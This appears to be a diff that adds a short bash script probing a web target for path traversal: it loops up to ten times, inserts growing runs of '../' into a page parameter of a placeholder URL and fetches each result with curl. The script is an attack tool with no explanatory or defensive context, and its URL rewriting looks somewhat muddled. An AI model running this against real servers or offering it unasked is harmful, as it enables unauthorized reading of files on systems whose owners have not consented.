@@ -1,0 +1,8 @@
+for i in {1..10}; do
+  url="[{TARGET URL}]"
+  for ((j=0; j<i; j++)); do
+    url="${url%\?page=*}?{PARAMETER}../${url#*\?page=}"
+  done
+  curl "$url" -o -
+  echo "$url" " => $i"
+done
